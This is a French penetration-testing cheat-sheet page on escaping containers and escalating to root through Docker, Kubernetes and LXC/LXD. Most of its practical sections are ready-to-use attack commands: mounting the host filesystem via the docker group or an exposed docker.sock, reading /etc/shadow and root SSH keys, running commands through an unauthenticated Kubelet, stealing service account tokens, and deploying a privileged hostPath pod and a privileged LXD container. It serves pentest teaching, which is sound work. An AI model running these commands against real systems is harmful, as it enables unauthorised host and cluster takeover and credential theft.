# Conteneurs : Docker, Kubernetes et LXC

Les environnements conteneurises sont omnipresents en production. L'isolation qu'ils offrent donne une fausse impression de securite : un conteneur mal configure ou un acces a l'API Kubernetes suffit a compromettre le systeme hote. Cette page couvre l'escalade de privileges via Docker, Kubernetes et LXC/LXD.

## Pourquoi

En pentest, il est courant d'atterrir dans un conteneur. L'objectif est alors de s'en evader pour atteindre le systeme hote. Meme hors d'un conteneur, l'appartenance au groupe `docker` ou `lxd` equivaut a un acces root. Et sur les clusters Kubernetes, un acces a l'API Kubelet non authentifiee ou un service account trop permissif peut mener a la compromission de l'ensemble du cluster.

## Comment ca marche

### Docker

Docker isole les applications dans des conteneurs qui partagent le noyau du systeme hote. L'escalade de privileges via Docker repose sur trois vecteurs principaux.

| Vecteur | Condition |
|---|---|
| **Groupe docker** | L'utilisateur est membre du groupe `docker` |
| **Docker socket** | Le socket `/var/run/docker.sock` est accessible en ecriture |
| **Volumes partages** | Un conteneur a acces a des repertoires sensibles du systeme hote |

### Kubernetes

Kubernetes orchestre des conteneurs dans des pods. L'escalade repose sur l'acces a l'API serveur, au Kubelet, ou sur les privileges du service account associe au pod.

| Composant | Port | Risque |
|---|---|---|
| API server | 6443 | Controle total du cluster si authentifie |
| Kubelet API | 10250 | Execution de commandes dans les pods |
| Kubelet (read-only) | 10255 | Enumeration des pods et configurations |
| etcd | 2379-2380 | Base de donnees du cluster (secrets, tokens) |

### LXC / LXD

LXD est un hyperviseur de conteneurs systeme. Contrairement a Docker qui isole une application, LXD encapsule un systeme d'exploitation complet. L'appartenance au groupe `lxd` permet de creer des conteneurs privilegies qui montent le systeme de fichiers hote.

## En pratique

### Evasion Docker via volumes partages

```bash
# - Depuis l'interieur d'un conteneur, chercher des montages du hote
ls -la /hostsystem/ 2>/dev/null
mount | grep -v "overlay\|tmpfs"

# - Si un repertoire du hote est monte
cat /hostsystem/home/*/.ssh/id_rsa 2>/dev/null
cat /hostsystem/etc/shadow 2>/dev/null

# - Utiliser la cle SSH trouvee pour se connecter au hote
ssh user@<IP_HOTE> -i /tmp/id_rsa
```

### Evasion Docker via le socket

```bash
# - Depuis un conteneur, verifier la presence du socket Docker
ls -la /var/run/docker.sock 2>/dev/null
ls -la /app/docker.sock 2>/dev/null

# - Lister les conteneurs en cours d'execution
docker -H unix:///app/docker.sock ps

# - Creer un conteneur privilegie avec le systeme hote monte
docker -H unix:///app/docker.sock run --rm -d --privileged \
  -v /:/hostsystem <IMAGE_DISPONIBLE>

# - Entrer dans le nouveau conteneur
docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash

# - Acceder au systeme hote
cat /hostsystem/root/.ssh/id_rsa
```

### Escalade via le groupe docker

```bash
# - Verifier l'appartenance au groupe
id
# groups=...,116(docker)

# - Lister les images disponibles
docker image ls

# - Monter le systeme hote et obtenir root
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# - On a maintenant un shell root sur le systeme hote
cat /etc/shadow
cat /root/.ssh/id_rsa
```

{% hint style="danger" %}
L'appartenance au groupe docker est equivalente a root. Il n'existe aucune mitigation tant que l'utilisateur est dans ce groupe. La seule solution est de retirer l'utilisateur du groupe.
{% endhint %}

### Escalade Kubernetes

{% tabs %}
{% tab title="Enumeration" %}
```bash
# - Tester l'acces a l'API server
curl -k https://<IP_CIBLE>:6443/

# - Enumerer les pods via Kubelet
curl -k https://<IP_CIBLE>:10250/pods | jq .

# - Ou avec kubeletctl
kubeletctl -i --server <IP_CIBLE> pods

# - Scanner les pods vulnerables a l'execution de commandes
kubeletctl -i --server <IP_CIBLE> scan rce
```
{% endtab %}
{% tab title="Execution de commandes" %}
```bash
# - Executer une commande dans un pod
kubeletctl -i --server <IP_CIBLE> exec "id" -p nginx -c nginx
# uid=0(root) gid=0(root) groups=0(root)

# - Extraire le token du service account
kubeletctl -i --server <IP_CIBLE> exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -p nginx -c nginx | tee k8.token

# - Extraire le certificat CA
kubeletctl --server <IP_CIBLE> exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
  -p nginx -c nginx | tee ca.crt
```
{% endtab %}
{% tab title="Escalade avec le token" %}
```bash
# - Lister les privileges du service account
export token=$(cat k8.token)
kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://<IP_CIBLE>:6443 auth can-i --list

# - Si on peut creer des pods, monter le systeme hote
# Creer un fichier YAML de pod privilegie
cat << 'EOF' > privesc.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root
  volumes:
  - name: mount-root
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
EOF

# - Deployer le pod
kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://<IP_CIBLE>:6443 apply -f privesc.yaml

# - Acceder au systeme hote via le pod
kubeletctl --server <IP_CIBLE> exec \
  "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
{% endtab %}
{% endtabs %}

### Escalade LXC/LXD

```bash
# - Verifier l'appartenance au groupe lxd
id
# groups=...,116(lxd)

# - Importer une image de conteneur
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list

# - Creer un conteneur privilegie
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk \
  source=/ path=/mnt/root recursive=true

# - Demarrer et entrer dans le conteneur
lxc start privesc
lxc exec privesc /bin/bash

# - Acceder au systeme hote
ls -la /mnt/root/root/
cat /mnt/root/etc/shadow
```

## Pieges et galeres

- **Docker sans images** : si aucune image n'est disponible localement et que le systeme n'a pas acces a Internet, il faut transferer une image manuellement
- **Kubernetes RBAC** : meme avec un token valide, les privileges peuvent etre limites. Toujours lister les permissions avec `auth can-i --list` avant de tenter quoi que ce soit
- **LXD non initialise** : si LXD n'a jamais ete configure (`lxd init`), il faudra peut-etre l'initialiser ou importer une image depuis un autre moyen
- **Namespaces reseau** : dans un conteneur, les interfaces reseau sont isolees. Pour pivoter, il peut etre necessaire de monter le systeme hote ou d'utiliser `hostNetwork: true` dans le YAML Kubernetes
- **Detection** : la creation de conteneurs privilegies genere des evenements dans les logs. Les solutions de securite Kubernetes (Falco, OPA Gatekeeper) peuvent bloquer ces operations

## Memo express

| Commande | Usage |
|---|---|
| `docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash` | Root via groupe docker |
| `docker -H unix:///path/docker.sock ps` | Lister les conteneurs via socket |
| `kubeletctl -i --server <IP> pods` | Lister les pods Kubernetes |
| `kubeletctl -i --server <IP> scan rce` | Pods vulnerables a RCE |
| `kubeletctl exec "id" -p <POD> -c <CONTAINER>` | Executer dans un pod |
| `kubectl auth can-i --list` | Privileges du service account |
| `lxc init <IMAGE> privesc -c security.privileged=true` | Conteneur LXD privilegie |
| `lxc exec privesc /bin/bash` | Shell dans le conteneur LXD |

***
